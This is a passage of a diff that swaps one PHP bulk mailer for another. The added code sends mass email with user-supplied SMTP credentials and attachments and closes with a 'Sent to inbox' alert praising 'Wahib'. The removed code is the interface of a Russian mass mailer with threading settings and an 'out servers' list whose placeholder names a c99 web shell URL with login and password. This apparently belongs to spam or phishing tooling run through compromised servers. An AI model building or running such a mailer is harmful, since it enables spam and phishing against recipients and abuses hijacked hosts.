+                if (isset($_POST['smtp_auth'])) {
+                    $mail->SMTPAuth = true;
+                    $mail->Username = $_POST['smtp_user']; // SMTP account username
+                    $mail->Password = $_POST['smtp_pass'];
+                }
+            }
+
+            //If this shit has an attachement
+            if (isset($_FILES['file']) && $_FILES['file']['error'] == UPLOAD_ERR_OK) {
+                $test = mime_content_type($_FILES['file']['tmp_name']);
+                $mail->AddAttachment($_FILES['file']['tmp_name'],
+                    $_FILES['file']['name'], "base64", mime_content_type($_FILES['file']['tmp_name']));
+
+            }
+
+            //Ok, let's send it !
+            if ($mail->send()) {
+                echo "Sent ! <br>";
+            } else {
+                echo "Not sent, sorry !<br>";
+            }
+        } else {
+            Print "$x -- Invalid email $to<br>";
+            flush();
+        }
+
+        echo "<script>alert('Sending Completed\\r\\nTotal Email $numemails\\r\\n-Sent to inbox\\r\\nPraise for Wahib :D');
+</script>";
+    }
 }
-String.prototype.replaceAll = function(search, replace){
-  return this.split(search).join(replace);
-}
-var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
-</script>
-</head>
-<body>
-	
-<div class="modal hide fade" id="univarsalUpload">
-	 <div class="modal-header">
-		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
-		<h3><?php tr('attachfile');?></h3>
-	</div>
-
-	<div class="modal-body">
-		<iframe src="<?php print $_SERVER['PHP_SELF'];?>?upload_universal" width="260px" height="80px" frameborder="0"></iframe>
-	</div>
-	<div class="modal-footer">
-		<a href="#" class="btn" data-dismiss="modal"><?php tr('close');?></a>
-		<a href="#" class="btn btn-primary" onclick="UploadClickHandler(this);return false"><?php tr('upload');?></a>
-	</div>
-</div>
-
-	
-<div class="modal hide fade" id="FileUploadDialog">
-	<div class="modal-header">
-		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
-		<h3><?php tr('uploadlist');?></h3>
-	</div>
-	<div class="modal-body">
-		<iframe src="<?php print $_SERVER['PHP_SELF'];?>?upload_form" width="260px" height="80px" frameborder="0"></iframe>
-	</div>
-	<div class="modal-footer">
-		<a href="#" class="btn" data-dismiss="modal"><?php tr('close');?></a>
-		<a href="#" class="btn btn-primary" onclick="UploadClickHandler(this);return false"><?php tr('upload');?></a>
-	</div>
-</div>
-	
-<div class="modal hide fade" id="LoadSaveDialog">
-	<div class="modal-header">
-		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
-		<h3><?php tr('uploadtemplate');?></h3>
-	</div>
-	<div class="modal-body">
-		<iframe src="<?php print $_SERVER['PHP_SELF'];?>?loadsave" width="260px" height="80px" frameborder="0"></iframe>
-	</div>
-	<div class="modal-footer">
-		<a href="#" class="btn" data-dismiss="modal"><?php tr('close');?></a>
-		<a href="#" class="btn btn-primary" onclick="UploadClickHandler(this);return false"><?php tr('upload');?></a>
-	</div>
-</div>
-
-	
-<div class="container">
-	<div class="row">
-		<div class="span12">
-			<div class="navbar">
-			    <div class="navbar-inner">
-				    <a class="brand" href="#" id="hello"><?php tr('name');?> <?php echo VERSION;?></a>
-				    <ul class="nav">
-					    <li><a href="#prime" id="prime"><img alt="<?php tr('main',false);?>" src="data:image/png;base64,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"></a></li>
-					    <li><a href="#help" id="help"><img alt="<?php tr('help',false);?>" src="data:image/png;base64,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"></a></li>
-					    <li><a href="#settings" id="settings"><img alt="<?php tr('settings',false);?>" src="data:image/png;base64,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"></a></li>
-				    </ul>
-				    <ul class="nav pull-right">
-				    	<li><a href="#" onclick="setLang('ru');return false">
-				    		<img alt="русский" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAMAAADXqc3KAAABSlBMVEUAAAD///8AAQEAAQEAAQEAAQEAAQHT09PX19fa2trc3Nze3t7f39/Ozs719fX5+fn8/Pz9/f3+/v7+/v7+/v7+/v7+/v7ExMTz8/P4+Pj7+/v9/f3+/v7Dw8Py8vL4+Pj8/Pz9/f3CwsLw8PD39/f5+fn6+vr7+/sCAsA9Pe08PPU8PPc8PPg8PPkCAr8zM+syMvIyMvUyMvYxMfYCAr0oKOgnJ/AnJ/MnJ/QnJ/QCArslJeYnJ+4nJ/AnJ/EmJvICAroVFeEVFeoVFe0VFe4VFe+4AgLgERHoERHqERHrEBDsEBC2AgLdDQ3lDAzoDAzqDQ21AgLZCAjjCAjmCQnnCQnoCAizAgLXBQXfBQXjBQXkBQXlBQWzBQXVBwfbCAjhEBDjFhbmGxvlHBzmHx/mICDmISG4DAy5EBC9ERHAERHCERHDERHEERHpaBTVAAAAB3RSTlMAAAQMECQwISWBWgAAAGZJREFUKFPNjUEKgDAMBHdr0kP//1dBxdhIW1qoF0FwjjNkA3wPg4JOM+ZgF0ZWqnUOYRoPSlwF+WLXIWwxbwmUvtYHtTvE6dQvAnpK0HdTNVolh9Rsd2DgEsbPpZ4MnAabaic8eFyiFV6rXRgALgAAAABJRU5ErkJggg==" />
-				    	</a></li>
-				    	<li><a href="#" onclick="setLang('en');return false">
-				    		<img alt="english" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAEM0lEQVRIie2Ua0jVZxzHSxJ6YaBBCFFYYtpeNJagjqaDQalbi+zFaGkT5yzWiiajTYsZTXIt87Z5qdkU04aF9ww6HrVjamfaIW/pqSyPnTpXtSzzkqn77Hn+madYbzaKvdkfvi/O7/L5PpffeebN+//777/58xfU79hBl05Hi66LiH3FeH+UiffGLKHsORkM/dStXYva25u+7m7e257/Qj5L6QnbU0R9Rjbn/f3RZmUh2dLApWb3boxpaYz29zM9PU3LNRvHCjtIPtVBSlEHaac7mZn5E3tODraMDGYmJjhZrldysuZoQTuNrXcYLC3FlJ7OiNlMW1ubNHCRBq6+m5O5o2niVkwMQxUVAjaDwfyI2JTLbI2vVSQNDFFR3N66lenRUb460qTEv/yxEX1TJ8bYWOyFhTwZG8M+NEzQp2nSwFUxcHrrO3YmqvmjoQtjfDz3Dh3i6fAwY+OT/FzcSdg3KrGzGW6Hh9MbFsbU48d8kdjAkfyr2MoqMERHMyKOeGpqivbrNvYcqUMyXzD4lpBdpQTvqiTz93bMefn0btvGoytXlKb61rs8fTrFzS1buB4czOTDh9TVdWPcvx9jXBwTAwM8mZwkr6JbYUiWZDoMVu8jKKqYwM9LCIwuJTKhlpsXLnFdrNacnc2k2PakAOhDQugODGTiwQN6IyKwFRQocaPlITsPX1R6JUOyJHPO4KJGw+DgICMjI4wJ2Pj4+CvVGRREu5ikUVH7qrzslQzJ0gjmnEHuokU0rl5Ni48PV4R0/1KyVzIk64STk8MgR/zQrFqFdragVRaLef8nap3tlQzJOiEWPWegVqsxGo0MiMu6f/8+D8QZD4spelFDd+/StGQJWk/Pv+WkZI/slQzJqhFMxyX7fI3bulTcAn8RyuSDmGI69EaGhoa4kZREi58fA+JP2ODqStPy5Up80GqlR4z0ZXEc2oISAiKKlF6FIViS6TDw3ssi/6O4BKQRl1qL1WbH3NNDa2gorRs38lueGmtfH/Vi2w1Ll2K3D5BfplNW21deTqOXFx1x8ez+4bzCkCzJfMnAY306Zao2LBYLvWfO0LBiBVcPHWbz3hI8P/wVy61b1C5cyEVxTFarjYV+6WzfX4mh34RZr0crRrhZTFlR7jnc30952eDdLYnioevE0NuLTrxLGnFRlcfPsnxDNs6+KXgE53Dvxg1Uzs7ULl6MyWRW4lI+m3Kpbe4RMRPtCQlccHdH/VMqb4cedBhUV1fTrlJR4+uLNjKSg8lVCnyZkIQHhJ/CJHagWbmSS2vWYDZbWBF6XMkpNSE5JJ/UKJd7raqKc+LI8j/e5DAoOXCAXA8PTscnsO6TY7j5fT+rBEWrNiTRKKaiwM2NwmXLaGpunss907P69Z+lU3FOhUqYFIq7e27gIuQl9M5rltfz53rBrInra5aLwgbeqN64wV+Rl1Pcwvw+zwAAAABJRU5ErkJggg==" />
-				    	</a></li>
-				    </ul>
-				    
-			    </div>
-			</div>
-			
-		</div>	
-	</div>
-	
-	<div class="row section-screen" id="help-screen">
-		<div class="span12">
-			<div class="well">
-				<?php tr('helppage',false);?>
-			</div>
-		</div>
-	</div>
-	
-	<div class="row section-screen" id="preview-screen">
-		<div class="span12">
-			<div class="well">
-				<h3><?php tr('preview');?></h3>
-				<button class="btn prime-button"><?php tr('backtoeditor',false);?></button>
-				<iframe src="about:blank" style="width:100%; height:600px;"></iframe>
-				<button class="btn prime-button"><?php tr('backtoeditor',false);?></button>
-			</div>
-		</div>
-	</div>
-	
-	
-
-	
-	<div class="row section-screen" id="settings-screen">
-		<div class="span12">
-			<div class="well">
-				<h2><?php tr('settings');?></h2>
-				<ul class="nav nav-tabs">
-				    <li class="active"><a href="#home-tab"data-toggle="tab"><?php tr('settings-primary')?></a></li>
-				    <li><a href="#outservers-tab" data-toggle="tab"><?php tr('settings-outservers')?></a></li>
-				    <li><a href="#security-tab" data-toggle="tab"><?php tr('settings-security')?></a></li>
-			    </ul>
-			    <div class="tab-content">
-					<div class="tab-pane active" id="home-tab">
-						<?php tr('threadsnum');?><br>
-						<div class="btn-group">
-							<input type="button" class="btn" onclick="dThreads();" value="<?php tr('less',false);?>"><button class="btn" id="THREADS">4</button><input type="button" class="btn" onclick="iThreads();" value="<?php tr('more',false);?>">		
-						</div>
-						
-						<br><br>
-						<?php tr('timeoutlen');?><br>
-						<input type="text" class="input-mini" id="TIMEOUT" value="0" style="height:25px; margin-top:10px;"><div id="TIMEOUT_RANGE" min="0" max="3600"></div>
-						<br><br>
-						<?php tr('settings-history-length')?> <input type="text" class="input-mini" id="maxDoneSize" value="25" style="height:25px; margin-top:10px;">
-					</div>
-					<div class="tab-pane" id="outservers-tab">
-						<input type="checkbox" id="use_out_servers" style="display:none;">
-						<button type="button" class="btn btn-danger btn-checkbox" data-toggle="#use_out_servers"><i class="icon-remove"></i></button> <?php tr('useoutservers');?><br><br>
-						<?php tr('settings-outservers-doc')?>
-						<br>
-						<textarea id="out_servers" style="width:100%; height:250px;" placeholder="Пример: http://serv4.ru/sw.php|c99|login:password"></textarea><br>
-						<?php tr('settings-outservers-check')?>
-						<br><br>
-						<div class="progress" id="outprogressbar">
-					    	<div class="bar bar-warning" style="width: 0%;"></div>
-					    	<div class="barcounter">0/0</div>
-					    </div>
-					    <?php tr('settings-outservers-check-log')?>
-					    <div class="well" id="pingout_log" style="width:860px; height:150px;overflow-y:scroll;"></div>
-					</div>
-					<div class="tab-pane" id="security-tab">
-						<?php 
-						$no_write_perm=false;
-						clearstatcache();
-						if(!is_writable(__FILE__)):
-						$no_write_perm=true;
-						?>
-					    <div class="alert alert-error">
-					    <?php tr('settings-security-notwritable')?>
-					    </div>
-						<?php endif;?>
-						<div class="alert alert-success" style="display:none;" id="passchangesuccess">
-					    <?php tr('settings-security-password-changed')?>
-					    </div>
-					    <div class="alert alert-error" style="display:none;" id="passchangeerror">
-					    <?php tr('settings-security-password-not-changed')?>
-					    </div>
-				        <table border=0>
-					        <tr>
-						        <td><input type="text" id="inputLogin" class="txtinput" placeholder="<?php tr('login',false);?>" <?php if($no_write_perm):?>readonly<?endif;?>></td>
-						        <td><input type="text" id="inputPassword" class="txtinput" placeholder="<?php tr('password',false);?>" <?php if($no_write_perm):?>readonly<?endif;?>></td>
-					        </tr>
-					        <tr>
-						        <td>
-						        	<button type="button" class="btn" onclick="ChangePass($('#inputLogin').val(),$('#inputPassword').val())" <?php if($no_write_perm):?>disabled<?endif;?>><?php tr('settings-security-set-password')?></button>
-							    </td><td>
-							        <button type="button" class="btn btn-danger" onclick="ChangePass('','');" <?php if($no_write_perm):?>disabled<?endif;?>><?php tr('settings-security-remove-password')?></button>
-						        </td>
-					        </tr>
-				        </table>
-						<br><br>
-						<input type="checkbox" id="use_proxy_server" style="display:none;">
